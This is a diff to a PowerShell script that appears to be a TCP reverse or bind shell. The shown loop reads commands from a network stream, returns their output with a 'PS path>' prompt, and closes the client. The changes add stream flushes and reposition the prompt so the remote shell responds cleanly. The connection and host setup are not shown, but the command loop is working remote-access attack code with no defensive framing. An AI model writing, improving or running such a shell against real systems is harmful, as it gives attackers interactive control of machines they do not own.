@@ -14,6 +14,7 @@ $stream.Write($out_bytes, 0, $out_bytes.Length)
 
 $out_bytes = ([text.encoding]::ASCII).GetBytes("PS " + (pwd).Path + "> ")
 $stream.Write($out_bytes, 0, $out_bytes.Length)
+$stream.Flush() 
 
 while (($i = $stream.Read($in_bytes, 0, $in_bytes.Length)) -ne 0)
 {
@@ -28,11 +29,15 @@ while (($i = $stream.Read($in_bytes, 0, $in_bytes.Length)) -ne 0)
 		Write-Error $_
 	}
 
-	$out_bytes = ([text.encoding]::ASCII).GetBytes($result + ($error[0] | Out-String) + "PS " + (pwd).Path + "> ")
+	$out_bytes = ([text.encoding]::ASCII).GetBytes($result + ($error[0] | Out-String))
 	$error.clear()
 	
 	$stream.Write($out_bytes, 0, $out_bytes.Length)
-	$stream.Flush()  
+	$stream.Flush()
+	
+	$out_bytes = ([text.encoding]::ASCII).GetBytes("PS " + (pwd).Path + "> ")
+	$stream.Write($out_bytes, 0, $out_bytes.Length)
+	$stream.Flush() 
 }
 
 $client.Close()
